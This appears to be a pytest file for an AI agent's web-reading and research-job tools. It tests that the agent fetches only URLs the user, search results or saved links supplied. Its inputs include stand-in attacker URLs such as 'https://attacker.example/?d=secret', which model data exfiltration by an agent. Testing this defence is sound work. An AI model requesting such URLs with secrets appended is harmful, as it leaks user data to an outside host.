from types import SimpleNamespace

import httpx
import pytest

from common.exceptions import ToolExecutionError
from core.agent.tools.jobs import ResearchJobTools
from core.agent.tools.search import SearchTools


class Tools(SearchTools, ResearchJobTools):
    def __init__(self, *, query="", history=(), saved=()):
        self.agent_run = SimpleNamespace(user_query=query, history=list(history))
        self.project_id, self.session_id = "project-1", "session-1"
        self.started = []
        saved_links = [{"url": url} for url in saved]

        async def list_saved_web_links(*, limit):
            return saved_links

        self.document_service = SimpleNamespace(list_saved_web_links=list_saved_web_links)

        async def start(**job):
            self.started.append(job)
            return {"job_id": "job-1", "state": "queued", "links": job["links"],
                    "session_id": None, "error_code": None,
                    "question": job["question"], "depth": job["depth"]}

        self.research_jobs = SimpleNamespace(start=start)


@pytest.mark.no_network
async def test_only_urls_from_the_user_search_pages_or_saved_links_are_known():
    tools = Tools(
        query="Summarize https://docs.example.com/guide.",
        history=[{"role": "user", "content": "see https://blog.example.com/post#top"},
                 {"role": "assistant", "content": "try https://agent-made.example.com"}],
        saved=["https://saved.example.com/page"],
    )
    tools._remember_result_urls([{"url": "https://found.example.com/a"}])

    for url in ("https://docs.example.com/guide", "https://blog.example.com/post/",
                "https://saved.example.com/page", "https://found.example.com/a"):
        assert await tools.web_url_is_known(url), url
    # The agent's own text, and a known URL with data appended, are not.
    assert not await tools.web_url_is_known("https://agent-made.example.com")
    assert not await tools.web_url_is_known("https://docs.example.com/guide?d=secret")


@pytest.mark.no_network
async def test_an_unknown_url_is_refused_before_any_request():
    requests = []
    tools = Tools()
    tools._web_page_client = httpx.AsyncClient(
        transport=httpx.MockTransport(lambda request: requests.append(request))
    )

    with pytest.raises(ToolExecutionError, match="Ask the user"):
        await tools.read_web_page("https://attacker.example/?d=secret")
    assert requests == []


@pytest.mark.no_network
async def test_a_research_job_only_receives_links_the_run_already_trusts():
    tools = Tools(query="Research https://docs.example.com/guide")

    with pytest.raises(ToolExecutionError, match="did not come from"):
        await tools.start_research_job("Find more", links=["https://attacker.example/x"])
    with pytest.raises(ToolExecutionError, match="did not come from"):
        await tools.start_research_job("Read https://attacker.example/?d=secret")
    assert tools.started == []

    await tools.start_research_job("Dig deeper", links=["https://docs.example.com/guide"])
    assert tools.started[0]["links"] == ["https://docs.example.com/guide"]
